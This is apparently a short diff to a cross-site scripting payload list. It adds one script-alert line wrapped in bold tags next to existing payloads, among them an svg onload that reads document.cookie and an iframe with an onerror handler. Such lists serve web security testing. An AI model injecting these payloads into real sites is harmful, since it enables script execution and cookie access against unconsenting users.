@@ -1,3 +1,4 @@
 "><svg onload=prompt(document.cookie)>
 <iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>
 <script>alert(1)</script>
+<b>12345</b><script>alert(1)</script><b>12345=</b>
